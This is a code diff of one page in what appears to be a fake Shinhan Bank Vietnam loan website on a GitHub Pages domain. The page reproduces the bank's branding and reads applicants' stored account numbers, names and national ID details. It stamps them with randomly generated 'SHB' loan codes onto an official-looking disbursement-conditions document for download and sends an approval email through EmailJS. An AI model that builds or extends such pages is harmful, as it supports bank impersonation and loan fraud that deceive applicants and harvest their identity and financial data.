@@ -8,15 +8,20 @@
     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
     <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.5/font/bootstrap-icons.css" rel="stylesheet">
     <style>
+        :root {
+            --primary-color: #003087;
+            --secondary-color: #f5f6f5;
+            --accent-color: #ff6200;
+        }
         body {
             font-family: 'Roboto', sans-serif;
             font-size: 16px;
-            background-color: #f8f9fa;
+            background-color: var(--secondary-color);
             margin: 0;
         }
         .header {
             padding: 15px;
-            background-color: #ffffff;
+            background-color: var(--primary-color);
             border-bottom: 1px solid #b3cde0;
             display: flex;
             justify-content: space-between;
@@ -33,7 +38,11 @@
         .header-icons i {
             font-size: 24px;
             cursor: pointer;
-            color: #0052cc;
+            color: #ffffff;
+            transition: color 0.3s;
+        }
+        .header-icons i:hover {
+            color: var(--accent-color);
         }
         .container {
             max-width: 90%;
@@ -51,12 +60,21 @@
                 margin: 0 auto;
             }
         }
+        .progress-percentage {
+            text-align: center;
+            font-size: 1rem;
+            color: var(--primary-color);
+            margin-bottom: 10px;
+        }
         .nav-tabs {
             display: flex;
             justify-content: space-around;
             margin-bottom: 25px;
             margin-top: 0;
             flex-wrap: nowrap;
+            overflow-x: auto;
+            white-space: nowrap;
+            -webkit-overflow-scrolling: touch;
         }
         .nav-tabs .nav-item {
             flex: 1;
@@ -71,16 +89,56 @@
             font-size: 14px;
             width: 100%;
             margin: 0 5px;
+            transition: background-color 0.3s;
         }
         .nav-tabs .nav-link.active {
-            background-color: #0033a0;
+            background-color: var(--primary-color);
             color: #ffffff;
+        }
+        .nav-tabs .nav-link:hover {
+            background-color: var(--accent-color);
+        }
+        .dropdown-menu {
+            min-width: 200px;
+            overflow-x: auto;
+            white-space: nowrap;
+        }
+        .dropdown-menu a {
+            color: var(--primary-color);
+            text-transform: uppercase;
+            font-size: 14px;
+            padding: 8px 12px;
+        }
+        .dropdown-menu a:hover {
+            background-color: var(--secondary-color);
+            color: var(--accent-color);
         }
         @media (max-width: 767px) {
             .nav-tabs .nav-link {
                 font-size: 10px;
                 padding: 6px 8px;
             }
+            .dropdown-menu a {
+                font-size: 12px;
+                padding: 6px 10px;
+            }
+            .progress-percentage {
+                font-size: 0.9rem;
+            }
+        }
+        .step-title {
+            color: var(--primary-color);
+            font-size: 18px;
+            font-weight: 700;
+            margin-bottom: 20px;
+            text-transform: uppercase;
+            text-align: center;
+        }
+        .step-description {
+            font-size: 14px;
+            text-align: center;
+            margin-bottom: 20px;
+            color: #1a3c87;
         }
         .image-section {
             text-align: center;
@@ -96,7 +154,6 @@
             border-radius: 8px;
             image-rendering: -webkit-optimize-contrast;
             image-rendering: crisp-edges;
-            visibility: visible;
         }
         #disbursementCanvas.loading {
             opacity: 0.5;
@@ -112,10 +169,10 @@
             transition: all 0.3s ease;
         }
         .btn-download:hover {
-            background-color: #138496;
+            background-color: var(--accent-color);
         }
         .btn-primary {
-            background-color: #0033a0;
+            background-color: var(--primary-color);
             border: none;
             border-radius: 20px;
             padding: 10px 20px;
@@ -125,12 +182,12 @@
             margin: 5px;
         }
         .btn-primary:hover {
-            background-color: #0052cc;
+            background-color: var(--accent-color);
         }
         .footer {
             text-align: center;
             padding: 20px;
-            background-color: #003087;
+            background-color: var(--primary-color);
             color: white;
             margin-top: 20px;
             font-size: 12px;
@@ -139,9 +196,10 @@
             color: #b3cde0;
             margin: 0 10px;
             text-decoration: none;
+            transition: color 0.3s;
         }
         .footer-links a:hover {
-            color: #ffffff;
+            color: var(--accent-color);
         }
         .button-group {
             display: flex;
@@ -165,29 +223,6 @@
         .divider-blue {
             border-top: 1px solid #b3cde0;
             margin: 15px 0;
-        }
-        .dropdown-menu {
-            min-width: 200px;
-        }
-        .dropdown-menu a {
-            color: #0033a0;
-            text-transform: uppercase;
-            font-size: 14px;
-            padding: 8px 12px;
-        }
-        .dropdown-menu a:hover {
-            background-color: #e6f0fa;
-            color: #0052cc;
-        }
-        .step-transition {
-            transition: opacity 0.5s ease, transform 0.5s ease;
-            opacity: 1;
-            transform: translateX(0);
-        }
-        . step-transition.hidden {
-            opacity: 0;
-            transform: translateX(20px);
-            pointer-events: none;
         }
         .messenger-btn {
             position: fixed;
@@ -263,6 +298,7 @@
     <hr class="divider-blue" style="margin: 0;">
 
     <div class="container">
+        <div class="progress-percentage">Tiến trình: 87.5% (Bước 7/8)</div>
         <ul class="nav-tabs">
             <li class="nav-item">
                 <a class="nav-link" href="#">1. Nhập thông tin</a>
@@ -275,16 +311,18 @@
             </li>
         </ul>
 
-        <div id="step8" class="step-transition">
+        <div id="step7" class="step-transition">
+            <h5 class="step-title">Điều Kiện Giải Ngân</h5>
             <div class="error-message" id="formError"></div>
+            <p class="step-description">Dưới đây là các điều kiện giải ngân của khoản vay. Vui lòng kiểm tra kỹ thông tin.</p>
             <div class="image-section">
                 <canvas id="disbursementCanvas"></canvas>
             </div>
             <hr class="divider-blue">
             <div class="button-group">
-                <a href="https://vaytieudung.github.io/shinhanbank/" class="btn btn-primary" id="backToHomeBtn">VỀ TRANG CHỦ</a>
+                <a href="https://vaytieudung.github.io/shinhanbank/pages/vi/step6.html" class="btn btn-primary">QUAY LẠI</a>
                 <button id="downloadDisbursementBtn" class="btn btn-download">TẢI XUỐNG</button>
-                <button id="proceedToFinalStepBtn" class="btn btn-primary">TÌM HIỂU THÊM</button>
+                <a href="https://vaytieudung.github.io/shinhanbank/pages/vi/step8.html" class="btn btn-primary" id="proceedToFinalStepBtn">HOÀN TẤT</a>
             </div>
         </div>
     </div>
@@ -292,20 +330,20 @@
     <div class="footer">
         <div class="footer-links">
             <a href="https://shinhan.com.vn/vi/page/chinh-sach-bao-mat.html">Chính sách bảo mật</a> |
-                <a href="https://vaytieudung.github.io/shinhanbank/pages/vi/dieu-khoan-su-dung.html">Điều khoản sử dụng</a> |
-                <a href="https://vaytieudung.github.io/shinhanbank/pages/vi/dieu-khoan-su-dung.html">Chính sách Cookies</a> |
-                <a href="https://shinhan.com.vn/vi/page/chinh-sach-lien-ket.html">Miễn khoản từ chối liên kết bên ngoài</a> |
-                <a href="https://vaytieudung.github.io/shinhanbank/pages/vi/financial-statement.html">Hướng dẫn truy cập web</a> |
-                <a href="https://shinhan.com.vn/vi/page/sitemap-2.html">Sitemap</a> |
-                <a href="https://vaytieudung.github.io/shinhanbank/pages/vi/dieu-khoan-su-dung.html">Trung tâm bảo mật</a> |
-                <a href="https://online.shinhan.com.vn/global.shinhan">Demo Ngân hàng trực tuyến</a> |
-                <a href="https://m.me/shinhanfinancer?hash=AbbheNwiAth9Hcp7&source_id=8585216">Liên hệ</a> |
-                <a href="https://vaytieudung.github.io/shinhanbank/pages/vi/global-shinhan.html">Trang Global Portal</a> |
-                <a href="https://vaytieudung.github.io/shinhanbank/pages/vi/gioi-thieu.html">Giới Thiệu</a>
-                   </div>
-            <p class="mt-2">Copyright © 2017 by SHINHAN Bank (Vietnam) Ltd,. All rights reserved.</p>
+            <a href="https://vaytieudung.github.io/shinhanbank/pages/vi/dieu-khoan-su-dung.html">Điều khoản sử dụng</a> |
+            <a href="https://vaytieudung.github.io/shinhanbank/pages/vi/dieu-khoan-su-dung.html">Chính sách Cookies</a> |
+            <a href="https://shinhan.com.vn/vi/page/chinh-sach-lien-ket.html">Miễn khoản từ chối liên kết bên ngoài</a> |
+            <a href="https://vaytieudung.github.io/shinhanbank/pages/vi/financial-statement.html">Hướng dẫn truy cập web</a> |
+            <a href="https://shinhan.com.vn/vi/page/sitemap-2.html">Sitemap</a> |
+            <a href="https://vaytieudung.github.io/shinhanbank/pages/vi/dieu-khoan-su-dung.html">Trung tâm bảo mật</a> |
+            <a href="https://online.shinhan.com.vn/global.shinhan">Demo Ngân hàng trực tuyến</a> |
+            <a href="https://m.me/shinhanfinancer?hash=AbbheNwiAth9Hcp7&source_id=8585216">Liên hệ</a> |
+            <a href="https://vaytieudung.github.io/shinhanbank/pages/vi/global-shinhan.html">Trang Global Portal</a> |
+            <a href="https://vaytieudung.github.io/shinhanbank/pages/vi/gioi-thieu.html">Giới Thiệu</a>
         </div>
-    </footer>
+        <p class="mt-3">Trung tâm bảo mật | Demo Ngân hàng trực tuyến | Liên hệ | Trang Global Portal | Giới Thiệu</p>
+        <p>© 2015 SHINHAN BANK VIETNAM ALL RIGHTS RESERVED.</p>
+    </div>
 
     <a href="https://m.me/shinhanfinancer?hash=AbbheNwiAth9Hcp7&source_id=8585216" target="_blank" class="messenger-btn">
         <img src="https://upload.wikimedia.org/wikipedia/commons/b/be/Facebook_Messenger_logo_2020.svg" alt="Messenger Logo">
@@ -313,44 +351,53 @@
 
     <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/crypto-js@4.1.1/crypto-js.min.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3.11.0/dist/email.min.js"></script>
     <script>
         emailjs.init("OrBsI926QI2_xBh1f");
-        let userData = {
-          accountNumber: "",
-          fullName: "",
-          bankName: "",
-          cccd: "",
-          idIssueDate: "",
-          idIssuePlace: ""
-        };
+        let userData = {};
 
         function formatNumber(number) {
-            if (!number) return "";
+            if (!number || number === "N/A" || number === 0) return "";
             return Number(number).toLocaleString('vi-VN');
         }
 
         function splitDate(dateStr) {
-            if (!dateStr) return { day: "", month: "", year: "" };
+            if (!dateStr || typeof dateStr !== 'string' || !/^\d{4}-\d{2}-\d{2}$/.test(dateStr) || dateStr === "N/A") {
+                return { day: "", month: "", year: "" };
+            }
             const [year, month, day] = dateStr.split("-");
             return { day: day || "", month: month || "", year: year || "" };
         }
 
         function calculateDueDate(disbursementDate, loanTerm) {
-            if (!disbursementDate || !loanTerm) return "";
+            if (!disbursementDate || !loanTerm || typeof disbursementDate !== 'string' || !/^\d{4}-\d{2}-\d{2}$/.test(disbursementDate) || disbursementDate === "N/A") {
+                return "";
+            }
             const date = new Date(disbursementDate);
+            if (isNaN(date.getTime())) {
+                return "";
+            }
             date.setMonth(date.getMonth() + parseInt(loanTerm));
+            if (isNaN(date.getTime())) {
+                return "";
+            }
             return date.toISOString().split('T')[0];
+        }
+
+        function generateRandomCode(prefix) {
+            const randomNum = Math.floor(100000 + Math.random() * 900000);
+            return `${prefix}${randomNum}`;
         }
 
         function saveToLocalStorage() {
             try {
                 const encryptedData = CryptoJS.AES.encrypt(JSON.stringify(userData), 'shinhan-secret-key').toString();
                 localStorage.setItem('userData', encryptedData);
-                console.log('Saved userData to localStorage:', userData);
+                console.log('Saved userData:', userData);
             } catch (error) {
-                console.error('Error saving userData to localStorage:', error);
+                console.error('Error saving userData:', error);
                 $('#formError').text('Lỗi lưu dữ liệu. Vui lòng thử lại.').show();
             }
         }
@@ -361,9 +408,15 @@
                 if (storedData) {
                     userData = JSON.parse(CryptoJS.AES.decrypt(storedData, 'shinhan-secret-key').toString(CryptoJS.enc.Utf8));
                     console.log('Loaded userData for Step 7:', userData);
+                    // Replace "N/A" or 0 with "" for all fields
+                    for (let key in userData) {
+                        if (userData[key] === "N/A" || userData[key] === 0) {
+                            userData[key] = "";
+                        }
+                    }
                     if (!userData.isRegistered || !userData.fullName) {
                         $('#formError').text('Không tìm thấy hồ sơ đã đăng ký. Vui lòng quay lại bước đăng ký.').show();
-                        $('#downloadDisbursementBtn, #proceedToFinalStepBtn, #backToHomeBtn').prop('disabled', true);
+                        $('#downloadDisbursementBtn, #proceedToFinalStepBtn').prop('disabled', true);
                         setTimeout(() => {
                             window.location.href = 'https://vaytieudung.github.io/shinhanbank/pages/vi/loan_registration.html';
                         }, 3000);
@@ -371,7 +424,7 @@
                 } else {
                     console.error('No userData found in localStorage');
                     $('#formError').text('Không tìm thấy dữ liệu hồ sơ. Vui lòng quay lại bước đăng ký.').show();
-                    $('#downloadDisbursementBtn, #proceedToFinalStepBtn, #backToHomeBtn').prop('disabled', true);
+                    $('#downloadDisbursementBtn, #proceedToFinalStepBtn').prop('disabled', true);
                     setTimeout(() => {
                         window.location.href = 'https://vaytieudung.github.io/shinhanbank/pages/vi/loan_registration.html';
                     }, 3000);
@@ -379,7 +432,7 @@
             } catch (error) {
                 console.error('Error parsing userData:', error);
                 $('#formError').text('Lỗi tải dữ liệu. Vui lòng quay lại bước đăng ký.').show();
-                $('#downloadDisbursementBtn, #proceedToFinalStepBtn, #backToHomeBtn').prop('disabled', true);
+                $('#downloadDisbursementBtn, #proceedToFinalStepBtn').prop('disabled', true);
                 setTimeout(() => {
                     window.location.href = 'https://vaytieudung.github.io/shinhanbank/pages/vi/loan_registration.html';
                 }, 3000);
@@ -394,12 +447,12 @@
             }
 
             const templateParams = {
-                fullName: userData.fullName || "Quý khách",
-                loanCode: userData.loanCode || "",
+                full_name: userData.fullName || "Quý khách",
+                loan_code: userData.loanCode || generateRandomCode("SHB"),
                 to_email: userData.email
             };
 
-            emailjs.send("service_60tgxof", "template_e8o1t4w", templateParams)
+            emailjs.send("service_60tgxof", "template_uhyb8ve", templateParams)
                 .then(response => {
                     console.log('Email sent successfully:', response.status, response.text);
                     $('#formError').text('Email thông báo đã được gửi đến ' + userData.email).show();
@@ -418,6 +471,7 @@
             img.src = imageUrl;
 
             canvas.classList.add('loading');
+            $('#formError').hide();
 
             img.onload = function() {
                 canvas.classList.remove('loading');
@@ -425,20 +479,23 @@
                 canvas.height = 1754;
                 ctx.drawImage(img, 0, 0, 1240, 1754);
                 canvasFields.forEach(field => {
-                    const value = field.value;
+                    const value = field.value || "";
                     if (value && field.x >= 0 && field.y >= 0 && field.x < canvas.width && field.y < canvas.height) {
                         ctx.font = field.font;
+                        ctx.fillStyle = "rgba(255, 255, 255, 0.9)";
+                        const rectHeight = field.font.includes("23px") ? 20 : 24;
+                        ctx.fillRect(field.x - 2, field.y - (rectHeight - 6), ctx.measureText(value).width + 4, rectHeight);
                         ctx.fillStyle = field.color;
                         ctx.fillText(value, field.x, field.y);
-                    } else {
-                        console.warn(`Invalid coordinates or empty value for field: ${value} at (${field.x}, ${field.y})`);
+                    } else if (field.x < 0 || field.y < 0) {
+                        console.warn(`Invalid coordinates for field: ${value} at (${field.x}, ${field.y})`);
                     }
                 });
-                console.log('Rendered canvas with fields:', canvasFields.map(f => ({ value: f.value, x: f.x, y: f.y })));
             };
 
             img.onerror = function() {
                 console.error('Failed to load image:', imageUrl);
+                $('#formError').text('Không thể tải hình ảnh điều kiện giải ngân từ nguồn chính. Đang thử nguồn dự phòng...').show();
                 img.src = fallbackUrl;
                 img.onload = function() {
                     canvas.classList.remove('loading');
@@ -448,35 +505,28 @@
                     ctx.fillStyle = '#000000';
                     ctx.font = '23px Arial';
                     ctx.fillText('Hình ảnh điều kiện giải ngân mặc định.', 10, 25);
+                    $('#formError').text('Đã sử dụng hình ảnh mặc định do lỗi tải nguồn chính.').show();
                 };
                 img.onerror = function() {
                     canvas.classList.remove('loading');
                     ctx.fillStyle = '#000000';
                     ctx.font = '23px Arial';
                     ctx.fillText('Không thể tải hình ảnh điều kiện giải ngân.', 10, 25);
+                    $('#formError').text('Lỗi: Không thể tải hình ảnh từ cả nguồn chính và dự phòng. Vui lòng thử lại sau.').show();
                 };
             };
         }
 
         const canvasFields = [
-            { label: "", value: "", x: -1, y: -1, font: "27px Arial bold", color: "#000000" },
-            { label: "", value: "", x: 423, y: 322, font: "23px Arial bold", color: "#000000" }, // accountNumber
-            { label: "", value: "", x: 429, y: 354, font: "23px Arial bold", color: "#000000" }, // fullName
-            { label: "", value: "", x: 423, y: 390, font: "23px Arial bold", color: "#000000" }, // bankName
-            { label: "", value: "", x: 429, y: 444, font: "23px Arial bold", color: "#000000" }, // fullName
-            { label: "", value: "", x: -1, y: -1, font: "23px Arial bold", color: "#000000" },
-            { label: "", value: "", x: 423, y: 487, font: "23px Arial bold", color: "#000000" }, // cccd
-            { label: "", value: "", x: 707, y: 487, font: "23px Arial bold", color: "#000000" }, // idIssueDate
-            { label: "", value: "", x: 952, y: 487, font: "23px Arial bold", color: "#000000" }, // idIssuePlace
-            { label: "", Wvalue: "", x: -1, y: -1, font: "23px Arial bold", color: "#000000" },
-            { label: "", value: "", x: -1, y: -1, font: "23px Arial bold", color: "#000000" },
-            { label: "", value: "", x: -1, y: -1, font: "23px Arial bold", color: "#000000" },
-            { label: "", value: "", x: -1, y: -1, font: "23px Arial bold", color: "#000000" },
-            { label: "", value: "", x: -1, y: -1, font: "23px Arial bold", color: "#000000" },
-            { label: "", value: "", x: -1, y: -1, font: "23px Arial bold", color: "#000000" },
-            { label: "", value: "", x: -1, y: -1, font: "23px Arial bold", color: "#000000" },
-            { label: "", value: `SHB${Math.floor(Math.random() * 100000)}`, x: 211, y: 60, font: "27px Arial bold", color: "#000000" }, // loanCode
-            { label: "", value: `SHB${Math.floor(Math.random() * 100000)}`, x: 211, y: 97, font: "27px Arial bold", color: "#000000" }  // loanCode
+            { value: "", x: 423, y: 322, font: "23px Arial bold", color: "#000000" }, // accountNumber
+            { value: "", x: 429, y: 354, font: "23px Arial bold", color: "#000000" }, // fullName
+            { value: "", x: 423, y: 390, font: "23px Arial bold", color: "#000000" }, // bankName
+            { value: "", x: 429, y: 444, font: "23px Arial bold", color: "#000000" }, // fullName
+            { value: "", x: 423, y: 487, font: "23px Arial bold", color: "#000000" }, // cccd
+            { value: "", x: 707, y: 487, font: "23px Arial bold", color: "#000000" }, // idIssueDate
+            { value: "", x: 952, y: 487, font: "23px Arial bold", color: "#000000" }, // idIssuePlace
+            { value: generateRandomCode("SHB"), x: 211, y: 60, font: "27px Arial bold", color: "#000000" }, // loanCode
+            { value: generateRandomCode("SHB"), x: 211, y: 97, font: "27px Arial bold", color: "#000000" }  // loanCode
         ];
 
         function downloadAsPDF(canvas, filename) {
@@ -493,20 +543,18 @@
         window.onload = function() {
             loadUserData();
 
-            const dueDate = calculateDueDate(userData.disbursementDate, userData.loanTerm);
+            canvasFields[0].value = userData.accountNumber || "";
+            canvasFields[1].value = userData.fullName || "";
+            canvasFields[2].value = userData.bankName || "";
+            canvasFields[3].value = userData.fullName || "";
+            canvasFields[4].value = userData.cccd || "";
+            canvasFields[5].value = userData.idIssueDate || "";
+            canvasFields[6].value = userData.idIssuePlace || "";
+            canvasFields[7].value = userData.loanCode || generateRandomCode("SHB");
+            canvasFields[8].value = userData.loanCode || generateRandomCode("SHB");
 
-            canvasFields[1].value = userData.accountNumber || "";
-            canvasFields[2].value = userData.fullName || "";
-            canvasFields[3].value = userData.bankName || "";
-            canvasFields[4].value = userData.fullName || "";
-            canvasFields[6].value = userData.cccd || "";
-            canvasFields[7].value = userData.idIssueDate || "";
-            canvasFields[8].value = userData.idIssuePlace || "";
-            canvasFields[16].value = `SHB${Math.floor(Math.random() * 100000)}`;
-            canvasFields[17].value = `SHB${Math.floor(Math.random() * 100000)}`;
-
-            renderCanvas('disbursementCanvas', 'https://raw.githubusercontent.com/vaytieudung/shinhanbank/main/assets/img/dieukiengiayngan.png', 'https://via.placeholder.com/1240x1754?text=Hinh+Dieu+Kien+Giai+Ngan');
-            userData.currentStep = 8;
+            renderCanvas('disbursementCanvas', 'https://raw.githubusercontent.com/vaytieudung/shinhanbank/main/assets/img/dieukiengiayngan.png', 'https://via.placeholder.com/1240x1754?text=Điều+Kiện+Giải+Ngân');
+            userData.currentStep = 7;
             saveToLocalStorage();
         };
 
@@ -515,21 +563,12 @@
             downloadAsPDF(canvas, `DieuKienGiaiNgan_${userData.loanCode || 'unknown'}.pdf`);
         });
 
-        $('#proceedToFinalStepBtn').on('click', function() {
-            sendApprovalEmail();
-            userData.isRegistered = true;
-            userData.isCompleted = true;
-            userData.currentStep = 9;
-            saveToLocalStorage();
-            window.location.href = 'https://vaytieudung.github.io/shinhanbank/pages/vi/step8.html';
-        });
-
-        $('#backToHomeBtn').on('click', function(e) {
+        $('#proceedToFinalStepBtn').on('click', function(e) {
             e.preventDefault();
             sendApprovalEmail();
-            userData.currentStep = 1;
+            userData.currentStep = 8;
             saveToLocalStorage();
-            window.location.href = 'https://vaytieudung.github.io/shinhanbank/';
+            window.location.href = 'https://vaytieudung.github.io/shinhanbank/pages/vi/step8.html';
         });
     </script>
 </body>
